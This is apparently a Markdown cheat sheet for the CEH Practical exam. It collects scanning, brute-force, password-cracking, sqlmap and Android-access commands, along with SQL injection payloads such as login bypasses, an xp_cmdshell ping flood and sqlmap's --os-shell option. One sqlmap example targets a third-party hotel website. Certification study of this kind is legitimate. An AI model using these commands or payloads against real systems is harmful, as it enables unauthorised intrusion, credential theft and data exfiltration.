Reference: 
https://github.com/DarkLycn1976/CEH-Practical-Notes-and-Tools
https://github.com/hunterxxx/CEH-v12-Practical
https://medium.com/@abdulmajidjamil/ceh-practical-lpt-master-ctf-notes-in-general-d0cb7007dacd
https://immpetus.gitbook.io/ceh-practical/nmap-tool

# Scanning

<details>
  <summary>Netdiscover</summary>


## Netdiscover 
  
```console
netdiscover -i eth0
netdiscover -r x.x.x.1/24
```
</details>

<details>
  <summary>Nmap</summary>

 * NMAP Scripts
```console
nmap -p 389 -T4 -A -v --script ldap-rootdse nnn.nnn.nnn.nnn/nn
nmap --script ftp-brute -p 21 <host>
Nmap -Pn -p 3389 target > rdp  // grep -B 5 open rdp
Nmap -Pn -p 3306 target > mysql // grep -B 5 open mysql
```

 * Certain port scans
```console
Nmap -Pn -p 3389 target > rdp  // grep -B 5 open rdp
Nmap -Pn -p 3306 target > mysql // grep -B 5 open mysql
nmap -p443,80,53,135,8080,8888 -A -O -sV -sC -T4 -oN nmapOutput 10.10.10.10
```

* To scan the live Host
```console
nmap -sP x.x.x.1/24                 
nmap -sn x.x.x.1/24
```
* To find the Specific open port 
```console
nmap -p port x.x.x.1/24 --open
```
* To find the OS 
```console
nmap -O x.x.x.x 
```
* Comprehensive Scan
```console
nmap -Pn -A x.x.x.1/24 -vv --open   
```

</details>

# If have web service, try enumerate:
<details>
  <summary>Gobuster</summary>
  
```shell
gobuster -e -u http://10.10.10.10 -w wordlsit.txt
```

```shell
gobuster vhost -v -w /home/username/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://workers.htb -o vhosts.txt --append-domain

> if you don't "--append-domain", you might not find anything
```
</details>



# Credential / Password Attacks
<details>
   <summary>Bruteforce SMB</summary>

* SMB Cracking with Hydra
  
```console
hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.118 smb
```
* SMB Cracking with Metasploit

```console
For Cracking SMB Password:
we need to make folder -> store wordlist into that -> run msf from that folder | This process makes your work even better and smooth.
>msfconsole .
>use auxiliary/scanner/smb/smb_login
>show option | To get an idea of what to set on
>set PASS_FILE ./ROKYOU.TXT
>set rhost {target IP address} | notes :- rhost means remote host
>set SMBUser name [of the user] | (generally Administrator is username)
>run
```
</details>


  </details>

<details>
  <summary>Bruteforce SSH</summary>
  
```console
hydra -l username -P passlist.txt x.x.x.x ssh
```
</details>

<details>
  <summary>Bruteforce TELNET</summary>
  
```console
hydra -l admin -P passlist.txt -o test.txt x.x.x.x telnet
```
</details>

<details>
  <summary>Bruteforce FTP</summary>

```console
    TRY user "annoymous" + no password
  ```
```console
hydra -L userlist.txt -P passlist.txt ftp://x.x.x.x

• If the service isn't running on the default port, use -s
hydra -L userlist.txt -P passlist.txt ftp://x.x.x.x -s 221

• Used to download the specific file from FTP to attacker or local machine
get flag.txt ~/Desktop/filepath/flag.txt


```
</details>

<details>
 <summary>Password Cracking - John</summary>

```console
john --single --format=md5crypt crack.txt
```
</details>

<details>
 <summary>Password Cracking - Hashcat</summary>

```console
Hashcat
```
</details>

<details>
 <summary>Password Cracking - WIFI Encryption </summary>

```console
aircrack-ng pcap.cap -w /usr/share/wordlists/rockyou.txt
```

</details>





# Vulnerability Scanning 

<details>
  <summary>Nessus</summary>
  
```console
Nessus runs on https[:]//localhost[:]8834
```
</details>

<details>
  <summary>Nikto</summary>
  
```console
nikto -h 
```
</details>

# Hidden text

<details>
  <summary>Snow</summary>
  
```console
snow -C -p "magic" readme2.txt
```
</details>

<details>
<summary>Steghide</summary>

```console
```
</details>




# WIRESHARK
<details>

  ```shell
    select_packet > follow > TCP Stream
  ```
  * To the get the specific method like ( post , get )
  
  ```console
  http.request.method==post
  http.request.method==get
  ```
  * To the Find DOS & DDOS, go to Statistics and Select Conversations , sort by packets in IPv4 based on number of Packets transfer
  
  ```shell
  Statistics > Conversations > IPv4 > Packets
  ```
View Flood attack on victim via Wireshark 
```console
•	| use filter tcp.port=21 
 ```
https://www.comparitech.com/net-admin/wireshark-cheat-sheet/
</details>



# SQL

<details>

```console
SQLMAP Extract DBS
•	sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="xookies xxx" --dbs

Extract Tables
•	sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope --tables

Extract Columns
•	sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope -T User_Login --columns

Dump Data
•	sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope -T User_Login --dump

OS Shell to execute commands
•	sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="cookies xxx" --os-shell

Login bypass
•	blah' or 1=1 --

Insert data into DB from login
•	blah';insert into login values ('john','apple123');

Create database from login
•	blah';create database mydatabase;

Execute cmd from login
•	blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; --
```

Other SQLi
```shell
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1—
```


SQLMAP

```shell
* For finding DBs:
sqlmap -u "------/id=1" --dbs --batch
sqlmap -u "https://bliss-hotel.000webhostapp.com/room_details.php?room_type_id=RM101" --dbs --batch

* Find DBs 
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch

* Find Tables =
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --table --batch

* Find columns = 
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns --batch

* Dump table =
 sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump --batch

* Dump the DB =
 sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --dump-all --batch

* Using cookies : 
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --cookie='JSESSIONID=09h76qoWC559GH1K7DSQHx' --random-agent --level=1 --risk=3 --dbs --batch

* manual SQL Injection
in login page enter blah' or 1=1-- as username and click login without entering the password

* GET access of OS Shell = 
sqlmap -u 'url' --dbms=mysql --os-shell SQL Shell = sqlmap -u 'url' --dbms=mysql --sql-shell
```

</details>
</details>





# VERACRYPT 


# CUSTOM WORDLIST 

<details>
<summary>Cewl</summary>
  
* cewl is the tool, example.com is the site, -m is to specify the minimum length of the word , -w is to specify the output file
  
```console
cewl example.com -m 5 -w words.txt
```
</details>



# MOBILE 

<details>
  <summary>ADB</summary>
  
* To Install ADB
```console
apt-get update
sudo apt-get install adb -y
adb devices -l
```
* Connection Establish Steps

```console
adb connect x.x.x.x:5555
adb devices -l
adb shell  
```
* To navigate
```console
pwd
ls
cd Download
ls
cd sdcard
```
* Download a File from Android using ADB tool
```console
adb pull /sdcard/log.txt C:\Users\admin\Desktop\log.txt 
adb pull sdcard/log.txt /home/mmurphy/Desktop
```
</details>

<details>
  <summary>PhoneSploit</summary>
  
* To install Phonesploit 

```console
git clone https://github.com/aerosol-can/PhoneSploit
cd PhoneSploit
pip3 install colorama
OR
python3 -m pip install colorama
```
* To run Phonesploit
```console
python3 phonesploit.py
```
* Type 3 and Press Enter to Connect a new Phone OR Enter IP of Android Device
* Type 4, to Access Shell on phone
* Download File using PhoneSploit
```console
9. Pull Folders from Phone to PC
```
* Enter the Full Path of file to Download
```console
sdcard/Download/secret.txt
```  
</details>




# resources 

* https://github.com/nirangadh/ceh-practical/blob/main/module03-Scanning-Networks.txt
* https://github.com/Samson-DVS/CEH-Practical-Notes/tree/main

